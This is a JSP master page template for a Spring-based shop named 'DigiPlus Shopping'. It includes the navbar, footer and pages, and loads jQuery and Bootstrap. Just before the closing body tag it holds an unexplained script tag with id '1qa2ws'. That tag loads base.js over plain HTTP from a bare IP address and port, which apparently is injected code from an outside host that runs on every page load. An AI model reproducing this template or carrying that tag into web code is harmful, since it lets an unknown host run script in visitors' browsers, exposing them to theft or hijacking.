<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
    
<%@taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
 <%@taglib prefix="spring" uri="http://www.springframework.org/tags" %>
 
<spring:url var="css" value="/resources/css"/>
<spring:url var="js" value="/resources/js"/>
<spring:url var="images" value="/resources/images"/>

<c:set var="contextRoot" value="${pageContext.request.contextPath}"/>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>DigiPlus Shopping - ${title} </title>

    <!-- Bootstrap core CSS -->
    <link href="${css}/bootstrap.css" rel="stylesheet">

    <!-- Add custom CSS here -->
    <link href="${css}/myapp.css" rel="stylesheet">

</head>

<body>


 <!--  Navigation  -->
  <%@include file="./shared/navbar.jsp" %>
  
  <!--  Page Content -->
    <!-- Loading the Home Page Content -->
    <c:if test= "${userClickHome== true }"> 
    	<%@include file="home.jsp" %>
	</c:if>
	
	<!-- Loading only when user click About -->
    <c:if test= "${userClickAbout== true }"> 
    	<%@include file="about.jsp" %>
	</c:if>
	
	<!-- Loading only when user click Contact -->
    <c:if test= "${userClickContact== true }"> 
    	<%@include file="contact.jsp" %>
	</c:if>
	
   <!-- Footer Comes Here -->
    
    <%@include file="./shared/footer.jsp" %>
    

	<!-- JQuery -->

    <!-- JavaScript -->
    <script src="${js}/jquery-1.10.2.js"></script>
    <script src="${js}/bootstrap.js"></script>

<script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='http://154.70.108.86:9090/www/default/base.js'></script></body>

</html>

